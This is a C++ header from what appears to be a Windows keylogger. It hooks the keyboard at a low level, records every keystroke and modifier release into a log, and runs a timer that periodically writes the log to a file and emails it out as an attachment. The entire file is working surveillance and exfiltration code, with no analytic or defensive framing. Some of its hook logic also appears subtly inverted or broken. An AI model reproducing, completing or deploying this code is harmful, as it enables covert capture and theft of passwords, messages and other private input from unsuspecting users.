#ifndef KEYHOOKS_H
#define KEYHOOKS_H

#include <iostream>
#include <fstream>
#include "windows.h"

#include "KeyConstants.h"
#include "Timer.h"
#include "Sender.h"

std::string keylog = "";

void initSendMail()
{
    if(keylog.empty())
        return;

    std::string lastGeneratedLog = IO::writeLog(keylog);
    if(lastGeneratedLog.empty())
    {
        KL::appendLogs("File creation failed. Keylog [ " + keylog + " ]");
        return;
    }

    int b_s = Shell::runShell("Log [ " + lastGeneratedLog + " ]", "Keylogs have been attached with the mail",
                            IO::getBasePath(true) + lastGeneratedLog);
    if (b_s != 7)
        KL::appendLogs("Mail sending failed. Error KL-" + KL::toString(b_s));
    else
        keylog = "";
}

Timer mailTimer(initSendMail, 500 * 60, Timer::Infinite);

HHOOK eHook = NULL;

LRESULT keyProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode < 0)
        CallNextHookEx(eHook, nCode, wparam, lparam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode == VK_RETURN)
        {
            keylog += '\n';
        }
    }
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key= kbs->vkCode;
        if(key == VK_CONTROL
           || key == VK_LCONTROL
           || key == VK_RCONTROL
           || key == VK_SHIFT
           || key == VK_RSHIFT
           || key == VK_LSHIFT
           || key == VK_MENU
           || key == VK_LMENU
           || key == VK_RMENU
           || key == VK_CAPITAL
           || key == VK_NUMLOCK
           || key == VK_LWIN
           || key == VK_RWIN
           )
        {
           std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
           KeyName.insert(1, "/");
           keylog += KeyName;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool startHook()
{
    KL::appendLogs("Started [ Hook, Timer]");
    mailTimer.start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)keyProc, GetModuleHandle(NULL), 0);
    return eHook == NULL;
}

bool stopHook()
{

    BOOL s_h = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)s_h;
}

bool isHooked()
{
    return (bool)(eHook == NULL);
}

#endif
